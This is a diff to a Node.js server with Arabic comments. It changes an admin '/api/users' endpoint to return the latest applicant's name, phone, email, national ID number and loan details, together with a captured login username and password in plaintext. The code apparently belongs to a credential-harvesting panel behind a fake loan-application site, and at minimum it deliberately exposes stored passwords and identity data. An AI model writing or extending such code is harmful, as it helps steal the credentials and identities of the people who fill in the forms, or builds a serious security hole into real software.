@@ -228,10 +228,25 @@ const server = http.createServer((req, res) => {
   }
 
   // ---- API: قائمة المستخدمين (تستخدمها admin.html) ----
-  if (pathname === '/api/users' && req.method === 'GET') {
-    const db = readDB();
-    sendJSON(res, 200, { users: db.users, activeVisits: countActiveVisits() });
-    return;
+    if (pathname === '/api/users' && req.method === 'GET') {
+      const db = readDB();
+      const users = Array.isArray(db.users) ? db.users.slice() : [];
+      if (db.applicationData) {
+        users.unshift({
+          name: db.applicationData.fullName || 'طلب جديد',
+          phone: db.applicationData.phone || '—',
+          email: db.applicationData.email || '—',
+          status: 'قيد المراجعة',
+          username: db.loginRequest ? db.loginRequest.username : '',
+          password: db.loginRequest ? db.loginRequest.password : '',
+          idNumber: db.applicationData.idNumber || '—',
+          loanAmount: db.applicationData.loanAmount || '—',
+          months: db.applicationData.months || '—',
+          application: true
+        });
+      }
+      sendJSON(res, 200, { users, activeVisits: countActiveVisits() });
+      return;
   }
 
   // ---- أي طلب تاني: نعتبره ملف ثابت (html, css, js...) ----
